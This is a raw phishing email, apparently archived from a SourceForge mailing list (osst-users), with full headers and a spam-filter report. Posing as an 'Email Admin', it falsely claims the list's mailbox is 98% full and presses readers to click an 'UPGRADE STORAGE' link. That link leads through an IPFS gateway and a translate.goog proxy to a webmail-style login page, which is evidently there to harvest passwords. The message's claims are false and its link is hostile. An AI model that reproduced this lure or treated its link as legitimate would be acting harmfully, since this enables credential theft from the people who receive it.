Return-Path: <osst-users-bounces@lists.sourceforge.net>
X-Original-To: lists+osst-users@lfdr.de
Delivered-To: lists+osst-users@lfdr.de
Received: from lists.sourceforge.net (lists.sourceforge.net [216.105.38.7])
	by mail.lfdr.de (Postfix) with ESMTPS id 818DD623B9F
	for <lists+osst-users@lfdr.de>; Thu, 10 Nov 2022 07:11:07 +0100 (CET)
Received: from [127.0.0.1] (helo=sfs-ml-4.v29.lw.sourceforge.com)
	by sfs-ml-4.v29.lw.sourceforge.com with esmtp (Exim 4.95)
	(envelope-from <osst-users-bounces@lists.sourceforge.net>)
	id 1ot0mI-0005Js-7a
	for lists+osst-users@lfdr.de;
	Thu, 10 Nov 2022 06:11:06 +0000
Received: from [172.30.20.202] (helo=mx.sourceforge.net)
 by sfs-ml-4.v29.lw.sourceforge.com with esmtps (TLS1.2) tls
 TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384 (Exim 4.95)
 (envelope-from <admin@seambee.buzz>) id 1ot0mF-0005Jl-UV
 for osst-users@lists.sourceforge.net; Thu, 10 Nov 2022 06:11:03 +0000
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
 d=sourceforge.net; s=x; h=Content-Transfer-Encoding:Content-Type:MIME-Version
 :Message-ID:Date:Subject:To:From:Sender:Reply-To:Cc:Content-ID:
 Content-Description:Resent-Date:Resent-From:Resent-Sender:Resent-To:Resent-Cc
 :Resent-Message-ID:In-Reply-To:References:List-Id:List-Help:List-Unsubscribe:
 List-Subscribe:List-Post:List-Owner:List-Archive;
 bh=f9fOZeXk3WQowg5bR/KlU9va+uRTqAZP+KfSHEbouS0=; b=XrZ/L8zUzs/ty1+S85+LF62psy
 E3WoOyxDuy66Pqsuo9PwdoupUi+w+sRSv2z8ZnNbPeGVK5228QwssnjDN/RxLtUXSaT4LB96C1aEO
 DArU94zC6ADlxzTixo4OQhH4LJFyLOO6tB2uFynOGFti8pg8JzKV5Q7mezMdta/MRzUE=;
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed; d=sf.net; s=x
 ;
 h=Content-Transfer-Encoding:Content-Type:MIME-Version:Message-ID:Date:
 Subject:To:From:Sender:Reply-To:Cc:Content-ID:Content-Description:Resent-Date
 :Resent-From:Resent-Sender:Resent-To:Resent-Cc:Resent-Message-ID:In-Reply-To:
 References:List-Id:List-Help:List-Unsubscribe:List-Subscribe:List-Post:
 List-Owner:List-Archive; bh=f9fOZeXk3WQowg5bR/KlU9va+uRTqAZP+KfSHEbouS0=; b=C
 z9n7jM1hA/vxZPjEbkejPQGHrfPclvzJKzkzuGfawj4kk2mONZbptQR82seMktqdr1mr4KFxXqymc
 /kYnh8OkmfX5Ot1Zg5cFt4hT4uI8KH8fcHN4MA7YEl2kxBgZbtNMxOZaCP0SvVu+r0sWJT21+kl9g
 wtjHIIYTPSZZa2hs=;
Received: from [103.149.28.153] (helo=mail.seambee.buzz)
 by sfi-mx-2.v28.lw.sourceforge.com with esmtp (Exim 4.95)
 id 1ot0mC-0007tQ-Em for osst-users@lists.sourceforge.net;
 Thu, 10 Nov 2022 06:11:02 +0000
Received: from seambee.buzz (unknown [46.183.222.100])
 by mail.seambee.buzz (Postfix) with ESMTPA id 3DFC68D0A6
 for <osst-users@lists.sourceforge.net>; Thu, 10 Nov 2022 00:48:04 -0500 (EST)
From: Email Admin<admin@seambee.buzz>
To: osst-users@lists.sourceforge.net
Date: 10 Nov 2022 07:48:03 +0200
Message-ID: <20221110074803.DDB9AD7ECF864F18@seambee.buzz>
MIME-Version: 1.0
X-Spam-Score: 5.7 (+++++)
X-Spam-Report: Spam detection software,
 running on the system "util-spamd-1.v13.lw.sourceforge.com", 
 has NOT identified this incoming email as spam.  The original
 message has been attached to this so you can view it or label
 similar future email.  If you have any questions, see
 the administrator of that system for details.
 Content preview:  osst-users@lists.sourceforge.net mailbox is 98% full. 2.36
 GB 1.98 GB Your mailbox osst-users@lists.sourceforge.net will not send or
 receive messages with attachments due to low space from today 11/10/2022
 7:48:03 a.m.. You are required to upgrade your storage immediate [...] 
 Content analysis details:   (5.7 points, 6.0 required)
 pts rule name              description
 ---- ---------------------- --------------------------------------------------
 1.0 RCVD_IN_UCE1           RBL: IP Listed in UCEPROTECT Level 1
 [103.149.28.153 listed in dnsbl-1.uceprotect.net]
 0.0 SPF_HELO_NONE          SPF: HELO does not publish an SPF Record
 -0.0 SPF_PASS               SPF: sender matches SPF record
 0.0 HTML_MESSAGE           BODY: HTML included in message
 0.1 MIME_HTML_ONLY         BODY: Message only has text/html MIME parts
 0.0 T_KAM_HTML_FONT_INVALID Test for Invalidly Named or Formatted
 Colors in HTML 1.6 FROM_SUSPICIOUS_NTLD_FP From abused NTLD
 0.5 FROM_SUSPICIOUS_NTLD   From abused NTLD
 1.3 RDNS_NONE Delivered to internal network by a host with no rDNS
 1.2 TO_NO_BRKTS_NORDNS_HTML To: lacks brackets and no rDNS and HTML
 only
X-Headers-End: 1ot0mC-0007tQ-Em
Subject: [Osst-users] osst-users@lists.sourceforge.net / Urgent action
 required..!!
X-BeenThere: osst-users@lists.sourceforge.net
X-Mailman-Version: 2.1.21
Precedence: list
List-Id: <osst-users.lists.sourceforge.net>
List-Unsubscribe: <https://lists.sourceforge.net/lists/options/osst-users>,
 <mailto:osst-users-request@lists.sourceforge.net?subject=unsubscribe>
List-Archive: <http://sourceforge.net/mailarchive/forum.php?forum_name=osst-users>
List-Post: <mailto:osst-users@lists.sourceforge.net>
List-Help: <mailto:osst-users-request@lists.sourceforge.net?subject=help>
List-Subscribe: <https://lists.sourceforge.net/lists/listinfo/osst-users>,
 <mailto:osst-users-request@lists.sourceforge.net?subject=subscribe>
Content-Type: multipart/mixed; boundary="===============4369051126004966882=="
Errors-To: osst-users-bounces@lists.sourceforge.net

--===============4369051126004966882==
Content-Type: text/html
Content-Transfer-Encoding: quoted-printable

<HTML><HEAD>
<META name=3DGENERATOR content=3D"MSHTML 11.00.9600.19699"></HEAD>
<BODY>
<P style=3D'BOX-SIZING: border-box; MARGIN-BOTTOM: 1.5em; FONT-SIZE: small;=
 FONT-FAMILY: "Lucida Grande", Verdana, Arial, Helvetica, sans-serif; WHITE=
-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: 600; =
COLOR: rgb(0,0,102); FONT-STYLE: normal; TEXT-ALIGN: center; ORPHANS: 2; WI=
DOWS: 2; MARGIN-TOP: 0px; LETTER-SPACING: normal; TEXT-INDENT: 0px; font-va=
riant-ligatures: normal; font-variant-caps: normal; -webkit-text-stroke-wid=
th: 0px; text-decoration-thickness: initial;=20
text-decoration-style: initial; text-decoration-color: initial'><FONT size=
=3D4>osst-users@lists.sourceforge.net mailbox is&nbsp;</FONT><SPAN style=3D=
"FONT-SIZE: large; COLOR: rgb(218,60,47)">98%&nbsp;</SPAN><SPAN style=3D"FO=
NT-SIZE: large">full.</SPAN></P>
<TABLE style=3D'FONT-SIZE: small; FONT-FAMILY: "Lucida Grande", Verdana, Ar=
ial, Helvetica, sans-serif; WHITE-SPACE: normal; WORD-SPACING: 0px; BORDER-=
COLLAPSE: collapse; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(51,5=
1,51); FONT-STYLE: normal; ORPHANS: 2; WIDOWS: 2; LETTER-SPACING: normal; f=
ont-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-stro=
ke-width: 0px; text-decoration-thickness: initial; text-decoration-style: i=
nitial; text-decoration-color: initial'=20
cellSpacing=3D0 cellPadding=3D0 width=3D325 align=3Dcenter border=3D0>
<TBODY style=3D"BOX-SIZING: border-box">
<TR style=3D"BOX-SIZING: border-box; HEIGHT: 0.5em">
<TD style=3D"BOX-SIZING: border-box; WIDTH: 320px; BACKGROUND: rgb(218,60,4=
7); MARGIN: 0px"><FONT size=3D4>&nbsp;</FONT></TD>
<TD style=3D"BOX-SIZING: border-box; BACKGROUND: rgb(224,224,224); MARGIN: =
0px"><FONT size=3D4>&nbsp;</FONT></TD></TR></TBODY></TABLE>
<TABLE style=3D'FONT-SIZE: small; FONT-FAMILY: "Lucida Grande", Verdana, Ar=
ial, Helvetica, sans-serif; WHITE-SPACE: normal; WORD-SPACING: 0px; BORDER-=
COLLAPSE: collapse; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(51,5=
1,51); FONT-STYLE: normal; ORPHANS: 2; WIDOWS: 2; LETTER-SPACING: normal; f=
ont-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-stro=
ke-width: 0px; text-decoration-thickness: initial; text-decoration-style: i=
nitial; text-decoration-color: initial'=20
cellSpacing=3D0 cellPadding=3D0 width=3D325 align=3Dcenter border=3D0>
<TBODY style=3D"BOX-SIZING: border-box">
<TR style=3D"BOX-SIZING: border-box">
<TD style=3D"BOX-SIZING: border-box; MARGIN: 0px" align=3Dleft><SPAN style=
=3D"BOX-SIZING: border-box; FONT-WEIGHT: bold; COLOR: rgb(218,60,47)"><FONT=
 size=3D4>2.36 GB</FONT></SPAN></TD>
<TD style=3D"BOX-SIZING: border-box; MARGIN: 0px" align=3Dright><SPAN style=
=3D"BOX-SIZING: border-box; FONT-WEIGHT: bold"><FONT size=3D4>1.98 GB</FONT=
></SPAN></TD></TR></TBODY></TABLE>
<P style=3D'BOX-SIZING: border-box; FONT-SIZE: small; FONT-FAMILY: "Lucida =
Grande", Verdana, Arial, Helvetica, sans-serif; WHITE-SPACE: normal; WORD-S=
PACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(34,34,34); =
FONT-STYLE: normal; TEXT-ALIGN: center; MARGIN: 3em auto; ORPHANS: 2; WIDOW=
S: 2; LETTER-SPACING: normal; TEXT-INDENT: 0px; font-variant-ligatures: nor=
mal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decora=
tion-thickness: initial; text-decoration-style:=20
initial; text-decoration-color: initial'><FONT size=3D4><SPAN style=3D"COLO=
R: rgb(51,51,51)">Your mailbox<SPAN>&nbsp;</SPAN></SPAN><FONT color=3D#134f=
5c><B>osst-users@lists.sourceforge.net</B></FONT><FONT color=3D#333333><SPA=
N>&nbsp;will</SPAN> not send or receive messages with attachments due to lo=
w space from today<SPAN>&nbsp;</SPAN></FONT><FONT color=3D#134f5c><B>11/10/=
2022 7:48:03 a.m.</B></FONT><FONT color=3D#333333>.</FONT><BR style=3D"BOX-=
SIZING: border-box"><FONT color=3D#333333>
You are required to upgrade your storage immediately now.&nbsp;</FONT></FON=
T></P>
<P style=3D'BOX-SIZING: border-box; FONT-SIZE: small; FONT-FAMILY: "Lucida =
Grande", Verdana, Arial, Helvetica, sans-serif; WHITE-SPACE: normal; WORD-S=
PACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(51,51,51); =
FONT-STYLE: normal; TEXT-ALIGN: center; MARGIN: 3em auto; ORPHANS: 2; WIDOW=
S: 2; LETTER-SPACING: normal; TEXT-INDENT: 0px; font-variant-ligatures: nor=
mal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decora=
tion-thickness: initial; text-decoration-style:=20
initial; text-decoration-color: initial'><U style=3D"BOX-SIZING: border-box=
"><FONT style=3D"BOX-SIZING: border-box" color=3D#0000ff size=3D4><SPAN sty=
le=3D"BOX-SIZING: border-box; FONT-WEIGHT: bolder">
<A style=3D"BOX-SIZING: border-box; COLOR: rgb(1,134,186); BACKGROUND-COLOR=
: transparent; text-decoration-line: none" href=3D"https://lkd5pugwfiufbzsa=
w6qwzqeirkhiqd4nyi-ipfs-dweb-link.translate.goog/?_x_tr_hp=3Dbafybeidxfsjmf=
r5ulfkn3nha&amp;_x_tr_sl=3Dauto&amp;_x_tr_tl=3Den&amp;_x_tr_hl=3Den-US#osst=
-users@lists.sourceforge.net" rel=3Dnoreferrer target=3D_blank=20
data-saferedirecturl=3D"https://www.google.com/url?q=3Dhttps://marshallasso=
ciates.co.za/cvx/roundcube/index.php?email%3Dinfo@advancedbathroomsolutions=
=2Ecom.au&amp;source=3Dgmail&amp;ust=3D1668117933800000&amp;usg=3DAOvVaw1xO=
ag6U_kUh-qUV1QjLpdp">UPGRADE osst-users@lists.sourceforge.net STORAGE</A></=
SPAN></FONT></U></P>
<P style=3D'BOX-SIZING: border-box; FONT-SIZE: small; FONT-FAMILY: "Lucida =
Grande", Verdana, Arial, Helvetica, sans-serif; WHITE-SPACE: normal; WORD-S=
PACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(34,34,34); =
FONT-STYLE: normal; TEXT-ALIGN: center; MARGIN: 3em auto; ORPHANS: 2; WIDOW=
S: 2; LETTER-SPACING: normal; TEXT-INDENT: 0px; font-variant-ligatures: nor=
mal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decora=
tion-thickness: initial; text-decoration-style:=20
initial; text-decoration-color: initial'><FONT size=3D4><SPAN style=3D"BOX-=
SIZING: border-box; FONT-WEIGHT: bolder; COLOR: rgb(51,51,51)">Mailbox addr=
ess:<BR style=3D"BOX-SIZING: border-box"></SPAN><FONT color=3D#134f5c><B>os=
st-users@lists.sourceforge.net</B></FONT><BR style=3D"BOX-SIZING: border-bo=
x"><FONT color=3D#333333>2022<SPAN>&nbsp;</SPAN></FONT><FONT color=3D#134f5=
c><B>lists.sourceforge.net</B></FONT><FONT color=3D#333333><SPAN>&nbsp;</SP=
AN>Email Administrator Inc. All Rights Reserved</FONT></FONT></P></BODY></H=
TML>


--===============4369051126004966882==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline


--===============4369051126004966882==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline

_______________________________________________
Osst-users mailing list
Osst-users@lists.sourceforge.net
https://lists.sourceforge.net/lists/listinfo/osst-users

--===============4369051126004966882==--
